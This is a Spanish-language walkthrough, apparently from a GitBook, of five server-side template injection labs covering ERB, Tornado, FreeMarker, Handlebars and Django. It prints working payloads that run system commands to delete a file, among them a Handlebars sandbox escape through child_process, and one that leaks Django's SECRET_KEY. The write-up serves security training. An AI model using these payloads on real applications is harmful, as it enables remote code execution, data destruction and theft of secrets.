# Server-side template injection

## Lab: Basic server-side template injection

### Enunciado

Este laboratorio es vulnerable a **inyección de plantillas del lado del servidor (SSTI)** debido a la construcción insegura de una plantilla ERB.

Para resolver el laboratorio, revisa la documentación de ERB para averiguar cómo ejecutar código arbitrario y luego elimina el archivo **morale.txt** del directorio personal de Carlos.

### Resolución

Primero identificamos que la aplicación usa ERB (plantillas de Ruby) al reflejar en la URL el contenido del parámetro `message`. Probamos si es vulnerable enviando `{{7*7}}`, que no se evalúa, y luego `<%= 7*7 %>`, que sí devuelve 49, confirmando ejecución de Ruby embebido.

<figure><img src="../../.gitbook/assets/image (1614).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1615).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1616).png" alt=""><figcaption></figcaption></figure>

Con eso ya sabemos que la plantilla ejecuta código Ruby, así que para resolver el laboratorio inyectamos directamente un comando del sistema. Usamos la sintaxis `<%= rm morale.txt %>` para ejecutar el borrado del archivo que pide el enunciado.

El servidor procesa la plantilla y al evaluar ese payload elimina el archivo `morale.txt` de la carpeta de Carlos.&#x20;

<figure><img src="../../.gitbook/assets/image (1617).png" alt=""><figcaption></figcaption></figure>

## Lab: Basic server-side template injection (code context)

### Enunciado

Este laboratorio es vulnerable a inyección de plantillas del lado del servidor debido a la forma insegura en que usa una plantilla de Tornado.

Para resolver el laboratorio, revisa la documentación de Tornado para descubrir cómo ejecutar código arbitrario, y luego elimina el archivo morale.txt del directorio home de Carlos.

Puedes iniciar sesión en tu propia cuenta usando las siguientes credenciales: wiener:peter.

### Resolución

Para resolver el laboratorio primero identificamos que el motor de plantillas es Tornado ya que al enviar una inyección con sintaxis de otro motor nos devuelve un error específico indicando que está usando Tornado.&#x20;

<figure><img src="../../.gitbook/assets/image (1618).png" alt=""><figcaption></figcaption></figure>

Con esto ajustamos el payload a la sintaxis de Tornado usando código en bloque con `{% %}` e inyectamos `{% import os %}{{ os.system('rm morale.txt') }}` en el campo vulnerable de _blog-post-author-display_. La petición se envía correctamente y en la respuesta vemos redirección y confirmación de éxito. Finalmente el laboratorio muestra que se resolvió al haber eliminado el archivo `morale.txt` en el sistema del usuario Carlos.

<figure><img src="../../.gitbook/assets/image (1619).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1620).png" alt=""><figcaption></figcaption></figure>

## Lab: Server-side template injection using documentation

### Enunciado

Este laboratorio es vulnerable a inyección de plantillas del lado del servidor. Para resolver el laboratorio, identifica el motor de plantillas y usa la documentación para averiguar cómo ejecutar código arbitrario, luego elimina el archivo morale.txt del directorio personal de Carlos.

Puedes iniciar sesión en tu propia cuenta usando las siguientes credenciales:

`content-manager:C0nt3ntM4n4g3r`

### Resolución

Encontramos que la aplicación usaba FreeMarker como motor de plantillas, lo que descubrimos provocando un error al inyectar variables mal formateadas en la plantilla editable del panel de Content Manager.&#x20;

<figure><img src="../../.gitbook/assets/image (1621).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1622).png" alt=""><figcaption></figcaption></figure>

Tras confirmar que era FreeMarker por el trace del error, buscamos en su documentación cómo ejecutar código. Finalmente, editamos la plantilla para incluir el payload con `freemarker.template.utility.Execute` para llamar a `rm morale.txt` y así borrar el archivo objetivo del directorio de Carlos, resolviendo el laboratorio exitosamente.

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")}
```

<figure><img src="../../.gitbook/assets/image (1623).png" alt=""><figcaption></figcaption></figure>

## Lab: Server-side template injection in an unknown language with a documented exploit

### Enunciado

Este laboratorio es vulnerable a inyección de plantillas del lado del servidor. Para resolver el laboratorio, identifica el motor de plantillas y encuentra un exploit documentado en línea que puedas usar para ejecutar código arbitrario, luego elimina el archivo morale.txt del directorio personal de Carlos.

### Resolución

Identificamos el motor de plantillas en uso como **Handlebars.js**, gracias al error detallado en la respuesta del servidor (que menciona explícitamente “handlebars/compiler/parser.js”).

<figure><img src="../../.gitbook/assets/image (1624).png" alt=""><figcaption></figcaption></figure>

Sabemos por la documentación y exploits públicos que Handlebars permite romper el sandbox usando helpers avanzados. Para ejecutar comandos, se abusa del acceso a `constructor` y se construye una cadena que llame a `require('child_process').execSync()`.

El payload final fue un template Handlebars ofuscado pero funcional, que logró invocar `rm morale.txt`, borrando el archivo en el servidor.

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

<figure><img src="../../.gitbook/assets/image (1625).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1626).png" alt=""><figcaption></figcaption></figure>

## Lab: Server-side template injection with information disclosure via user-supplied objects

### Enunciado

Este laboratorio es vulnerable a inyección de plantillas del lado del servidor debido a la forma en que se pasa un objeto a la plantilla. Esta vulnerabilidad puede explotarse para acceder a datos sensibles.

Para resolver el laboratorio, roba y envía la clave secreta del framework.

Puedes iniciar sesión en tu propia cuenta usando las siguientes credenciales:

`content-manager:C0nt3ntM4n4g3r`

### Resolución

Identificamos que la aplicación usa el motor de plantillas Django, ya que en el error del servidor aparece la ruta `/usr/local/lib/python2.7/dist-packages/django/template/base.py`. Sabemos que en Django las variables de configuración, como la clave secreta del framework, suelen estar expuestas en el objeto `settings`.

<figure><img src="../../.gitbook/assets/image (1627).png" alt=""><figcaption></figcaption></figure>

Para exfiltrar la clave secreta, editamos la plantilla para renderizar el valor de `settings.SECRET_KEY` así:

```
{{settings.SECRET_KEY}}
```

Al guardar la plantilla con este payload, la aplicación mostró la clave secreta en la descripción del producto. Finalmente, copiamos el valor y lo enviamos para completar el laboratorio.

<figure><img src="../../.gitbook/assets/image (1629).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1630).png" alt=""><figcaption></figcaption></figure>
